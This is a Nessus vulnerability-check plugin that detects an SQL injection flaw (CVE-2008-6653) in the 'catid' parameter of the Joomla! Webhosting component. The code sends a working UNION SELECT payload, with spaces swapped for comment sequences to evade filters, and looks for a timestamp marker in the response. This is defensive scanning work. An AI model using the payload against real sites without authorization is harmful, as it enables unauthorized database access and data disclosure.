#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(32124);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2008-6653");
  script_bugtraq_id(29000);
  script_osvdb_id(50423);
  script_xref(name:"EDB-ID", value:"5527");

  script_name(english:"Webhosting Component for Joomla! 'catid' Parameter SQLi");
  script_summary(english:"Attempts to manipulate category overview output.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Webhosting component for Joomla! running on the
remote host is affected by a SQL injection vulnerability in
webhosting.php due to improper sanitization of user-supplied input to
the 'catid' parameter before using it to construct database queries in
the show_overview() function. Regardless of the PHP 'magic_quotes_gpc'
setting, an unauthenticated, remote attacker can exploit this issue to
manipulate database queries, resulting in disclosure of sensitive
information, modification of data, or other attacks against the
underlying database.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/05/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/05/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Webhosting";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>Webhosting<', '<author>Jonas Brand<');
  checks["/administrator/components/com_webhosting/webhosting.xml"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Try to exploit the issue to manipulate a category overview.
magic = unixtime();
exploit = "99999 UNION SELECT " +magic+ ",2,3--";
url = "/index.php?option=com_webhosting&catid="+str_replace(find:" ", replace:"/**/", string:exploit);

w = http_send_recv3(
  method : "GET",
  item   : dir + url,
  port   : port,
  exit_on_fail : TRUE
);
res = w[2];

# There's a problem if we could manipulate the overview.
if ('option=com_webhosting&task=details&id='+magic+'&Itemid=' >< res)
{
  output = strstr(res, magic);
  if (empty_or_null(output)) output = res;

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    sqli        : TRUE,
    generic     : TRUE,
    request     : make_list(install_url + url),
    output      : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
